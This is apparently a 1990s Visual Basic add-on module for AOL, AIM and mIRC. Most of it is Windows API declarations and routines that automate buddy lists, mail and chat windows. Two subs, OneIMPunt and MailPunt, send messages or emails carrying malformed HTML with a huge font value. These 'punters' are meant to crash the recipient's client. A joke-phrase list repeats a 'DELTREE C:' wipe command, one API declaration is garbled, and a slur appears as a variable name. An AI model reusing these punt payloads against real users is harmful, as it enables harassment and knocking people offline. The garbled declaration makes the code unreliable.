Attribute VB_Name = "Kramer"
'Hey everyone. My name is Kramer. This is my first
'bas file and I hope to keep updating it and sending
'out newer versions. For all my latest stuff
'visit my webpage at:
'http://www.angelfire.com/biz2/sexydood
'If you decide to rip off my code please at least
'give me some credit. Thanks to SPYDER for most of
'of the basic stuff in this bas
'Hope you enjoy my bas. Mail me at hooter@angelfire.com
Public Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
Declare Function IsWindowEnabled Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function ReadProcessMemory Lib "kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As String, ByVal nSize As Long, ByRef lpNumberOfBytesWritten As Long) As Long
Private Declare Function GetWindowThreadProcessId Lib "user32" (ByVal hwnd As Long, lpdwProcessId As Long) As Long
Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Private Declare Sub RtlMoveMemory Lib "kernel32" (ByRef dest As Any, ByRef source As Any, ByVal nBytes As Long)
Declare Function RedrawWindow Lib "user32" (ByVal hwnd As Long, lprcUpdate As RECT, ByVal hrgnUpdate As Long, ByVal fuRedraw As Long) As Long
Declare Function MoveWindow Lib "user32" (ByVal hwnd As Long, ByVal X As Long, ByVal Y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal bRepaint As Long) As Long
Declare Function GetWindowRect Lib "user32" (ByVal hwnd As Long, lpRect As RECT) As Long
Declare Function SetRect Lib "user32" (lpRect As RECT, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Declare Function SetParent Lib "user32" (ByVal hWndChild As Long, ByVal hWndNewParent As Long) As Long
Declare Function dwGetStringFromLPSTR Lib "dwspy32.dll" (ByVal lpcopy As Long) As String
Declare Sub dwCopyDataBynum Lib "dwspy32.dll" Alias "dwCopyData" (ByVal source&, ByVal dest&, ByVal nCount&)
Declare Function dwGetAddressForObject& Lib "dwspy32.dll" (object As Any)
Declare Sub dwCopyDataByString Lib "dwspy32.dll" Alias "dwCopyData" (ByVal source As String, ByVal dest As Long, ByVal nCount&)
Declare Function dwXCopyDataBynumFrom& Lib "dwspy32.dll" Alias "dwXCopyDataFrom" (ByVal mybuf As Long, ByVal foreignbuf As Long, ByVal size As Integer, ByVal foreignPID As Long)
Declare Function dwGetWndInstance& Lib "dwspy32.dll" (ByVal hwnd&)
Declare Function RegisterWindowMessage& Lib "user32" Alias "RegisterWindowMessageA" (ByVal lpString As String)
Declare Function GetWindowLong& Lib "user32" Alias "GetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long)
Declare Function EnumWindows& Lib "user32" (ByVal lpEnumFunc As Long, ByVal lParam As Long)
Declare Function SendMessageByNum& Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long)
Declare Function GetClassName& Lib "user32" Alias "GetClassNameA" (ByVal hwnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long)
Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Declare Function DrawMenuBar Lib "user32" (ByVal hwnd As Long) As Long
Declare Function ShellAbout Lib "shell32.dll" Alias "ShellAboutA" (ByVal hwnd As Long, ByVal szApp As String, ByVal szOtherStuff As String, ByVal hIcon As Long) As Long
Declare Function GetParent Lib "user32" (ByVal hwnd As Long) As Long
Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Declare Function SendMessageByString Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As String) As Long
Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Integer, ByVal lParam As Long) As Long
Declare Function CreatePopupMenu Lib "user32" () As Long
Declare Function ShowWindow Lib "user32" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
Declare Function GetSubMenu Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Declare Function GetMenuItemID Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Declare Function GetMenu Lib "user32" (ByVal hwnd As Long) As Long
Declare Function GetMenuItemCount Lib "user32" (ByVal hMenu As Long) As Long
Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Declare Function GetTopWindow Lib "user32" (ByVal hwnd As Long) As Long
Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Declare Function SetFocusAPI Lib "user32" Alias "SetFocus" (ByVal hwnd As Long) As Long
Declare Function GetMenuString Lib "user32" Alias "GetMenuStringA" (ByVal hMenu As Long, ByVal wIDItem As Long, ByVal lpString As String, ByVal nMaxCount As Long, ByVal wFlag As Long) As Long
Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
Declare Function InsertMenu Lib "user32" Alias "InsertMenuA" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Declare Function AppendMenu Lib "user32" Alias "AppendMenuA" (ByVal hMenu As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Declare Function RemoveMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Declare Function DeleteMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Declare Function DestroyMenu Lib "user32" (ByVal hMenu%) As Integer
Declare Function sndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long
Declare Function EnableWindow Lib "user32" (ByVal hwnd As Long, ByVal cmd As Long) As Long
Public Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long



Declare Function ExitWindows Lib "user32" (ByVal RestartCode As Long, ByVal DOSReturnCode As Integer) As Integer

Declare Function ShowCursor Lib "user32" (ByVal bShow As Long) As Long







































Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, lpvParam As Any, ByVal fuWinIni As Long) As Long




Declare Sub ReleaseCapture Lib "user32" ()

Private Declare Function GetSystemMetrics Lib "user32" (ByVal nIndex As Long) As Long
Private Declare Function ShellUse Lib "shell32.dll Alias (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As String, ByVal nSize As Long, ByRef lpNumberOfBytesWritten As Long) As Long" ()


Private Declare Function OpenFile Lib "kernel32" (ByVal lpFileName As String, lpReOpenBuff As OFSTRUCT, ByVal wStyle As Long) As Long

Private Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
Private Declare Function GetProfileInt Lib "kernel32" Alias "GetProfileIntA" (ByVal lpAppname As String, ByVal lpKeyName As String, ByVal nDefault As Long) As Long
Private Declare Function GetProfileString Lib "kernel32" Alias "GetProfileStringA" (ByVal lpAppname As String, ByVal lpKeyName As String, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long) As Long
Private Declare Function WriteProfileString Lib "kernel32" Alias "WriteProfileStringA" (ByVal lpszSection As String, ByVal lpszKeyName As String, ByVal lpszString As String) As Long
Private Declare Function GetPrivateProfileInt Lib "kernel32" Alias "GetPrivateProfileIntA" (ByVal lpApplicationName As String, ByVal lpKeyName As String, ByVal nDefault As Long, ByVal lpFileName As String) As Long
Private Declare Function GetPrivateProfileString Lib "kernel32" Alias "GetPrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As String, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpString As String, ByVal lpFileName As String) As Long
Private Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As String, ByVal lpString As String, ByVal lpFileName As String) As Long



Public Const WM_CHAR = &H102
Public Const WM_SETTEXT = &HC
Public Const WM_USER = &H400
Public Const WM_KEYDOWN = &H100
Public Const WM_KEYUP = &H101
Public Const WM_CLEAR = &H303
Public Const WM_LBUTTONDOWN = &H201
Public Const WM_LBUTTONUP = &H202
Public Const WM_CLOSE = &H10
Public Const WM_GETTEXT = &HD
Public Const WM_COMMAND = &H111
Public Const WM_DESTROY = &H2
Public Const WM_GETTEXTLENGTH = &HE
Public Const WM_LBUTTONDBLCLK = &H203


Public Const WM_NCLBUTTONDOWN = &HA1
Public Const HTCAPTION = 2



Public Const LB_GETCOUNT = &H18B
Public Const LB_ADDSTRING = &H180
Public Const LB_GETITEMDATA = &H199
Public Const LB_DELETESTRING = &H182
Public Const LB_FINDSTRINGEXACT = &H1A2
Public Const LB_FINDSTRING = &H18F
Public Const LB_GETCURSEL = &H188
Public Const LB_GETTEXT = &H189
Public Const LB_GETTEXTLEN = &H18A
Public Const LB_SELECTSTRING = &H18C
Public Const LB_SETCOUNT = &H1A7
Public Const LB_SETCURSEL = &H186
Public Const LB_SETSEL = &H185
Public Const LB_INSERTSTRING = &H181

Public Const VK_DELETE = &H2E
Public Const VK_RIGHT = &H27
Public Const VK_HOME = &H24
Public Const VK_CONTROL = &H11
Public Const VK_DOWN = &H28
Public Const VK_LEFT = &H25
Public Const VK_RETURN = &HD
Public Const VK_SPACE = &H20
Public Const VK_TAB = &H9

Public Const BM_GETCHECK = &HF0
Public Const BM_GETSTATE = &HF2
Public Const BM_SETCHECK = &HF1
Public Const BM_SETSTATE = &HF3

Public Const SWP_NOMOVE = &H2
Public Const SWP_NOSIZE = &H1
Public Const SWP_CREATE = &H3

Public Const FLAGS = SWP_NOMOVE Or SWP_NOSIZE

Public Const SPI_SCREENSAVERRUNNING = 97


Public Const GW_HWNDFIRST = 0
Public Const GW_HWNDLAST = 1
Public Const GW_HWNDNEXT = 2
Public Const GW_HWNDPREV = 3
Public Const GW_OWNER = 4
Public Const GW_CHILD = 5
Public Const GW_MAX = 5


Public Const HWND_TOP = 0
Public Const HWND_TOPMOST = -1
Public Const HWND_NOTOPMOST = -2


Public Const SND_SYNC = &H0
Public Const SND_ASYNC = &H1
Public Const SND_NODEFAULT = &H2
Public Const SND_MEMORY = &H4
Public Const SND_LOOP = &H8
Public Const SND_NOSTOP = &H10


Public Const EW_RESTARTWINDOWS = &H42
Public Const EW_REBOOTSYSTEM = &H43


Public Const SW_HIDE = 0
Public Const SW_SHOWNORMAL = 1
Public Const SW_SHOWMINIMIZED = 2
Public Const SW_MAXIMIZE = 3
Public Const SW_SHOWMAXIMIZED = 3
Public Const SW_SHOWNOACTIVATE = 4
Public Const SW_SHOW = 5
Public Const SW_MINIMIZE = 6
Public Const SW_SHOWMINNOACTIVE = 7
Public Const SW_SHOWNA = 8
Public Const SW_RESTORE = 9
Public Const SW_SHOWDEFAULT = 10

Public Const MF_DELETE = &H200&
Public Const MF_CHANGE = &H80&
Public Const MF_ENABLED = &H0&
Public Const MF_DISABLED = &H2&
Public Const MF_APPEND = &H100&
Public Const MF_REMOVE = &H1000&
Public Const MF_POPUP = &H10&
Public Const MF_STRING = &H0&
Public Const MF_CHECKED = &H8&
Public Const MF_UNCHECKED = &H0&
Public Const MF_GRAYED = &H1&
Public Const MF_BYPOSITION = &H400&
Public Const MF_BYCOMMAND = &H0&


Public Const ERROR_SUCCESS = 0&
Public Const ERROR_INVALID_FUNCTION = 1&
Public Const ERROR_ACCESS_DENIED = 5&
Public Const ERROR_OUTOFMEMORY = 14&
Public Const ERROR_BAD_NETPATH = 53&
Public Const ERROR_ALREADY_ASSIGNED = 85&
Public Const ERROR_INVALID_PASSWORD = 86&
Public Const ERROR_INVALID_PASSWORDNAME = 1216&
Public Const GWL_STYLE = (-16)
Public Const GWW_HINSTANCE = (-6)
Public Const GWW_ID = (-12)
Public Const PROCESS_VM_READ = &H10
Public Const STANDARD_RIGHTS_REQUIRED = &HF0000


Private Const OF_READ = &H0
Private Const OF_WRITE = &H1
Private Const OF_READWRITE = &H2
Private Const OF_SHARE_COMBAT = &H0
Private Const OF_SHARE_EXCLUSIVE = &H10
Private Const OF_SHARE_DENY_WRITE = &H20
Private Const OF_SHARE_DENY_READ = &H30
Private Const OF_SHARE_DENY_NONE = &H40
Private Const OF_PARSE = &H100
Private Const OF_DELETE = &H200
Private Const OF_VERIFY = &H400
Private Const OF_CANCEL = &H800
Private Const OF_CREATE = &H1000
Private Const OF_PROMPT = &H2000
Private Const OF_EXIST = &H4000
Private Const OF_REOPEN = &H8000

'SystemMetrics()
Private Const SM_CXSCREEN = 0
Private Const SM_CYSCREEN = 1
Private Const SM_CXVSCROLL = 2
Private Const SM_CYHSCROLL = 3
Private Const SM_CYCAPTION = 4
Private Const SM_CXBORDER = 5
Private Const SM_CYBORDER = 6
Private Const SM_CXDLGFRAME = 7
Private Const SM_CYDLGFRAME = 8
Private Const SM_CYVTHUMB = 9
Private Const SM_CXHTHUMB = 10
Private Const SM_CXICON = 11
Private Const SM_CYICON = 12
Private Const SM_CXCURSOR = 13
Private Const SM_CYCURSOR = 14
Private Const SM_CYMENU = 15
Private Const SM_CXFULLSCREEN = 16
Private Const SM_CYFULLSCREEN = 17
Private Const SM_CYKANJIWINDOW = 18
Private Const SM_MOUSEPRESENT = 19
Private Const SM_CYVSCROLL = 20
Private Const SM_CXHSCROLL = 21
Private Const SM_DEBUG = 22
Private Const SM_SWAPBUTTON = 23
Private Const SM_RESERVED1 = 24
Private Const SM_RESERVED2 = 25
Private Const SM_RESERVED3 = 26
Private Const SM_RESERVED4 = 27
Private Const SM_CXMIN = 28
Private Const SM_CYMIN = 29
Private Const SM_CXSIZE = 30
Private Const SM_CYSIZE = 31
Private Const SM_CXFRAME = 32
Private Const SM_CYFRAME = 33
Private Const SM_CXMINTRACK = 34
Private Const SM_CYMINTRACK = 35
Private Const SM_CXDOUBLECLK = 36
Private Const SM_CYDOUBLECLK = 37
Private Const SM_CXICONSPACING = 38
Private Const SM_CYICONSPACING = 39
Private Const SM_MENUDROPALIGNMENT = 40
Private Const SM_PENWINDOWS = 41
Private Const SM_DBCSENABLED = 42
Private Const SM_CMOUSEBUTTONS = 43
Private Const SM_CMENTRICS = 44


Type RECT
   Left As Long
   Top As Long
   Right As Long
   bottom As Long
End Type

Type POINTAPI
   X As Long
   Y As Long
End Type





Private Type OFSTRUCT
      cBytes As Byte
      fFixedByte As Byte
      nErrCode As Integer
      Reserved1 As Integer
      Reserved2 As Integer
      szPathName(128) As Byte
End Type

Global Const GFSR_SYSTEMRESOURCES = 0
Global Const GFSR_GDIRESOURCES = 1
Global Const GFSR_USERRESOURCES = 2
Global Const WM_CUT = &H300
Global Const WM_COPY = &H301
Global Const WM_PASTE = &H302
Global Const WM_MDICREATE = &H220
Global Const WM_MDIDESTROY = &H221
Global Const WM_MDIACTIVATE = &H222
Global Const WM_MDIRESTORE = &H223
Global Const WM_MDINEXT = &H224
Global Const WM_MDIMAXIMIZE = &H225
Global Const WM_MDITILE = &H226
Global Const WM_MDICASCADE = &H227
Global Const WM_MDIICONARRANGE = &H228
Global Const WM_MDIGETACTIVE = &H229
Global Const WM_MDISETMENU = &H230
Global giBeepBox As Integer
Global r&
Global entry$
Global iniPath$





Sub BuddyList2List(list1 As ListBox)
'This adds the SN's in your buddy list to a listbox
'That way if you change SN's you can use this and
'the List2BuddyList sub to add all the SN's to your
'new buddy list without having to type a bunch of
'stuff.

Dim Count As Long

ParHand1& = FindWindow("AOL Frame25", "America  Online")
ParHand2& = FindWindowEx(ParHand1&, 0, "MDIClient", vbNullString)
OurParent& = FindWindowEx(ParHand2&, 0, "AOL Child", vbNullString)
Hand1& = FindWindowEx(OurParent&, 0, "_AOL_Icon", vbNullString)
Hand2& = FindWindowEx(OurParent&, Hand1&, "_AOL_Icon", vbNullString)
Butt% = FindWindowEx(OurParent&, Hand2&, "_AOL_Icon", vbNullString)
Call Click(Butt%)
TimeOut (1)

ParHand1& = FindWindow("AOL Frame25", "America  Online")
ParHand2& = FindWindowEx(ParHand1&, 0, "MDIClient", vbNullString)
OurParent& = FindWindowEx(ParHand2&, 0, "AOL Child", vbNullString)
Hand1& = FindWindowEx(OurParent&, 0, "_AOL_Icon", vbNullString)
but1% = FindWindowEx(OurParent&, Hand1&, "_AOL_Icon", vbNullString)
Call Click(but1%)
TimeOut (1)

ParHand1& = FindWindow("AOL Frame25", "America  Online")
ParHand2& = FindWindowEx(ParHand1&, 0, "MDIClient", vbNullString)
OurParent& = FindWindowEx(ParHand2&, 0, "AOL Child", vbNullString)
ourhandle& = FindWindowEx(OurParent&, 0, "_AOL_Listbox", vbNullString)
    Count& = SendMessage(ourhandle&, LB_GETCOUNT, 0&, 0&)
Count = Count&

ParHand1& = FindWindow("AOL Frame25", "America  Online")
ParHand2& = FindWindowEx(ParHand1&, 0, "MDIClient", vbNullString)
OurParent& = FindWindowEx(ParHand2&, 0, "AOL Child", vbNullString)
Hand1& = FindWindowEx(OurParent&, 0, "_AOL_Icon", vbNullString)
but2% = FindWindowEx(OurParent&, Hand1&, "_AOL_Icon", vbNullString)

ParHand1& = FindWindow("AOL Frame25", "America  Online")
ParHand2& = FindWindowEx(ParHand1&, 0, "MDIClient", vbNullString)
OurParent& = FindWindowEx(ParHand2&, 0, "AOL Child", vbNullString)
Hand1& = FindWindowEx(OurParent&, 0, "_AOL_Edit", vbNullString)
our% = FindWindowEx(OurParent&, Hand1&, "_AOL_Edit", vbNullString)
TimeOut (1)

For X = 0 To Count
Call Click(but2%)
addit = GetText(our%)
list1.AddItem addit
TimeOut (0.9)
Next X
End Sub

Function ClearMailBox()
Call AOL40_ReadMail
TimeOut (3.3)

ParHand1& = FindWindow("AOL Frame25", "America  Online")
ParHand2& = FindWindowEx(ParHand1&, 0, "MDIClient", vbNullString)
OurParent& = FindWindowEx(ParHand2&, 0, "AOL Child", vbNullString)
Hand1& = FindWindowEx(OurParent&, 0, "_AOL_Icon", vbNullString)
Hand2& = FindWindowEx(OurParent&, Hand1&, "_AOL_Icon", vbNullString)
Hand3& = FindWindowEx(OurParent&, Hand2&, "_AOL_Icon", vbNullString)
Hand4& = FindWindowEx(OurParent&, Hand3&, "_AOL_Icon", vbNullString)
Hand5& = FindWindowEx(OurParent&, Hand4&, "_AOL_Icon", vbNullString)
Hand6& = FindWindowEx(OurParent&, Hand5&, "_AOL_Icon", vbNullString)
Button% = FindWindowEx(OurParent&, Hand6&, "_AOL_Icon", vbNullString)
For X = 0 To CountMailz()
Call Click(Button%)
TimeOut (0.5)
Next X

End Function

Sub FowardMail(which As Long, who, body)
Call AOL40_ReadMail
TimeOut (3)
Call OpenEmailNew(which)
TimeOut (4)
Call MailClickForward(who, body)

End Sub


Function LamePhrase()
Tixt = RandomNumber(22)
If Tixt = 1 Then pecker = "EMU = EASTERN MICHIGAN UNIVERSITY?"
If Tixt = 2 Then pecker = "LOSER!"
If Tixt = 3 Then pecker = "IF YOU LIKE EMULATION GIVE ME A HELL YEAH!"
If Tixt = 4 Then pecker = "IF YOU'RE NOT DOWN WITH THE FACT THAT ZOPHAR IS KEWL, I GOT TWO WORDS FOR YA' SUCK IT!"
If Tixt = 5 Then pecker = "CAN SOMEONE DOWNLOAD AOL TO MY COMPUTER?"
If Tixt = 6 Then pecker = "ME AND MY DAD LOOKED ALL OVER TOWN FOR A STORE THAT SOLD EMULATORS BUT COULDN'T FIND ONE!"
If Tixt = 7 Then pecker = "CAN FAT PEOPLE HAVE EMULATORS?"
If Tixt = 8 Then pecker = "WOOOOOOOOO!"
If Tixt = 9 Then pecker = "LINUX=UNIX FOR WINDOWS 95, DUH!"
If Tixt = 10 Then pecker = "CAN SOMEONE SEND ME AN EMU THAT I CAN PLAY N64 GAMES ON? PREFERABLY AN NES EMULATOR."
If Tixt = 11 Then pecker = "MAN ITS A GOOD THING THE FEDS HAVEN'T FOUND OUT ABOUT EMULATION YET!"
If Tixt = 12 Then pecker = "WHATS THE ADDRESS TO ZOPHAR.NET?"
If Tixt = 13 Then pecker = "MY NESTICLE SAYS I NEED MORE MEMORY TO PLAY N64 ROMS CAN SOMEONE SEND ME MORE MEMORY?"
If Tixt = 14 Then pecker = "CAN ANYONE TEACH ME HOW TO GET ON EFNET?"
If Tixt = 15 Then pecker = "WHATS EFNET?"
If Tixt = 16 Then pecker = "CAN I GET ROMS ON AOL?"
If Tixt = 17 Then pecker = "IS EVERONE EXCITED ABOUT THE RELEASE OF VERSION 4.0 OF AOL?! I KNOW I AM!"
If Tixt = 18 Then pecker = "SORRY FELLAS I GG OR MY MOM WILL SPANK ME"
If Tixt = 19 Then pecker = "WHO IS THIS PEER GUY? AND WHY DOES HE KEEP RESETING PEOPLES CONNECTIONS?"
If Tixt = 20 Then pecker = "DOES ANYONE KNOW HOW TO SEND AN INSTANT MESSAGE ON AOL?"
If Tixt = 21 Then pecker = "HOW DO I BECOME A BOT?"
If Tixt = 22 Then pecker = "SOME GUY TOLD ME TO GO INTO DOS AND TYPE DELTREE C: TO GET HOOKED UP TO A ROM SITE BUT MY COMPUTER MESSED UP. CAN SOMEONE HELP?"

LamePhrase = pecker
End Function

Sub List2BuddyList(list1 As ListBox)

ParHand1& = FindWindow("AOL Frame25", "America  Online")
ParHand2& = FindWindowEx(ParHand1&, 0, "MDIClient", vbNullString)
OurParent& = FindWindowEx(ParHand2&, 0, "AOL Child", vbNullString)
Hand1& = FindWindowEx(OurParent&, 0, "_AOL_Icon", vbNullString)
Hand2& = FindWindowEx(OurParent&, Hand1&, "_AOL_Icon", vbNullString)
Butt% = FindWindowEx(OurParent&, Hand2&, "_AOL_Icon", vbNullString)
Call Click(Butt%)
TimeOut (1.3)

ParHand1& = FindWindow("AOL Frame25", "America  Online")
ParHand2& = FindWindowEx(ParHand1&, 0, "MDIClient", vbNullString)
OurParent& = FindWindowEx(ParHand2&, 0, "AOL Child", vbNullString)
Hand1& = FindWindowEx(OurParent&, 0, "_AOL_Icon", vbNullString)
but1% = FindWindowEx(OurParent&, Hand1&, "_AOL_Icon", vbNullString)
Call Click(but1%)
TimeOut (1.3)

ParHand1& = FindWindow("AOL Frame25", "America  Online")
ParHand2& = FindWindowEx(ParHand1&, 0, "MDIClient", vbNullString)
OurParent& = FindWindowEx(ParHand2&, 0, "AOL Child", vbNullString)
Hand1& = FindWindowEx(OurParent&, 0, "_AOL_Edit", vbNullString)
ourhandle& = FindWindowEx(OurParent&, Hand1&, "_AOL_Edit", vbNullString)

For X = 0 To list1.ListCount
Call SetFocusAPI(AORich%)
Call SendMessageByString(ourhandle&, WM_SETTEXT, 0, list1.List(X))
DoEvents
Call SendMessageByNum(ourhandle&, WM_CHAR, 13, 0)
TimeOut (0.6)
Next X
TimeOut (0.3)

ParHand1& = FindWindow("AOL Frame25", "America  Online")
ParHand2& = FindWindowEx(ParHand1&, 0, "MDIClient", vbNullString)
OurParent& = FindWindowEx(ParHand2&, 0, "AOL Child", vbNullString)
Hand1& = FindWindowEx(OurParent&, 0, "_AOL_Icon", vbNullString)
Hand2& = FindWindowEx(OurParent&, Hand1&, "_AOL_Icon", vbNullString)
nig% = FindWindowEx(OurParent&, Hand2&, "_AOL_Icon", vbNullString)
Call Click(nig%)
End Sub

Sub mIRCSendChat2Query(Chat)
ParHand1& = FindWindow("mIRC32", "mIRC32")
ParHand2& = FindWindowEx(ParHand1&, 0, "MDIClient", vbNullString)
OurParent& = FindWindowEx(ParHand2&, 0, "query", vbNullString)
ourhandle& = FindWindowEx(OurParent&, 0, "Edit", vbNullString)
Call SetFocusAPI(ourhandle&)
Call SendMessageByString(ourhandle&, WM_SETTEXT, 0, Chat)
DoEvents
Call SendMessageByNum(ourhandle&, WM_CHAR, 13, 0)

End Sub

Sub OneIMPunt(who$)
Call IMKeyword(who$, "</p><p align=center><font = 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999>")


End Sub
Sub MailPunt(who$, subject$)

Call SendMail(who$, subject$, "</P><P ALIGN=CENTER><FONT = 99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999>")
End Sub


Sub AOL40_ClickForward()

AOL% = FindWindow("AOL Frame25", 0&)
Icon% = FindChildByClass(AOL%, "_AOL_ICON")
Icon% = GetWindow(Icon%, GW_HWNDNEXT)
Icon% = GetWindow(Icon%, GW_HWNDNEXT)
Icon% = GetWindow(Icon%, GW_HWNDNEXT)
Icon% = GetWindow(Icon%, GW_HWNDNEXT)
Icon% = GetWindow(Icon%, GW_HWNDNEXT)
AOLClickIcon (Icon%)
End Sub


Public Function GetListIndex(LB As ListBox, txt As String) As Integer
Dim index As Integer
With LB
For index = 0 To .ListCount - 1
If .List(iIndex) = txt Then
GetListIndex = index
Exit Function
End If
Next index
End With
GetListIndex = -2
End Function
Function GetWinText(hwnd As Integer) As String

Dim LengthOfText, buffer$, GetTheText
LengthOfText = SendMessage(hwnd, WM_GETTEXTLENGTH, 0&, 0&)
buffer$ = Space$(LengthOfText)
GetTheText = SendMessageByString(hwnd, WM_GETTEXT, LengthOfText + 1, buffer$)
GetWinText = buffer$
End Function
Sub Form_Move(frm As Form)

DoEvents
ReleaseCapture
ReturnVal% = SendMessage(frm.hwnd, &HA1, 2, 0)
End Sub
Sub AOL40_ReadMail()

tool% = FindChildByClass(AOLWindow(), "AOL Toolbar")
Toolbar% = FindChildByClass(tool%, "_AOL_Toolbar")
Icon% = FindChildByClass(Toolbar%, "_AOL_Icon")
Call AOLClickIcon(Icon%)
End Sub

Sub AOLClose()

Call Window_Close(AOLWindow())
End Sub
Sub AOLChangeCaption(newcaption)

Call AOLSetText(AOLWindow(), newcaption)
End Sub
Sub AOLSetText(win, txt)

TheText% = SendMessageByString(win, WM_SETTEXT, 0, txt)
End Sub
Function AOLIsOnline() As Integer

welcome% = FindChildByTitle(AOLMDI(), "Welcome, ")
If welcome% = 0 Then
MsgBox "This prog works much better when your signed on.", 64, "Must Be Online"
AOLIsOnline = 0
Exit Function
End If
AOLIsOnline = 1
End Function
Function AOLRoomCount()

Chat% = AOL40_FindChatRoom()
List% = FindChildByClass(Chat%, "_AOL_Listbox")
Count% = SendMessage(List%, LB_GETCOUNT, 0, 0)
AOLRoomCount = Count%
End Function
Sub AOL40_AddRoomCombo(ListBox As ListBox, ComboBox As ComboBox)

Call AOL40_AddRoomList(ListBox)
For q = 0 To ListBox.ListCount
ComboBox.AddItem (ListBox.List(q))
Next q
End Sub
Function CountMailz()
'to use this properly, use it such as
'Msgbox "You have " & CountMailz & " mails"
'Coded by Kramer
TheMail% = FindChildByClass(AOLMDI(), "AOL Child")
TheTree% = FindChildByClass(TheMail%, "_AOL_Tree")
CountMailz = SendMessage(TheTree%, LB_GETCOUNT, 0, 0)
End Function

Sub AOL40_AntiIdle()

Modal% = FindWindow("_AOL_Modal", vbNullString)
Icon% = FindChildByClass(Modal%, "_AOL_Icon")
AOLClickIcon (AOIcon%)
End Sub

Sub AOL40_KillGlyph()

tool% = FindChildByClass(AOLWindow(), "AOL Toolbar")
Toolbar% = FindChildByClass(tool%, "_AOL_Toolbar")
Glyph% = FindChildByClass(Toolbar%, "_AOL_Glyph")
Call SendMessage(Glyph%, WM_CLOSE, 0, 0)
End Sub


Sub ADD_AOL_LB(itm As String, lst As ListBox)

If lst.ListCount = 0 Then
lst.AddItem itm
Exit Sub
End If
Do Until xx = (lst.ListCount)
Let diss_itm$ = lst.List(xx)
If Trim(LCase(diss_itm$)) = Trim(LCase(itm)) Then Let do_it = "NO"
Let xx = xx + 1
Loop
If do_it = "NO" Then Exit Sub
lst.AddItem itm
End Sub
Function AIM_IsUserOnline()
' Returns a True if Online, False if Not Online.
IsUserOnline1% = FindWindow("_Oscar_BuddyListWin", vbNullString)
If IsUserOnline1% <> 0 Then
IsUserOnline = True
Else
IsUserOnline = False
End If
End Function
Sub RefreshBuddyList()
Dim Count As Long

ParHand1& = FindWindow("AOL Frame25", "America  Online")
ParHand2& = FindWindowEx(ParHand1&, 0, "MDIClient", vbNullString)
OurParent& = FindWindowEx(ParHand2&, 0, "AOL Child", vbNullString)
Hand1& = FindWindowEx(OurParent&, 0, "_AOL_Icon", vbNullString)
Hand2& = FindWindowEx(OurParent&, Hand1&, "_AOL_Icon", vbNullString)
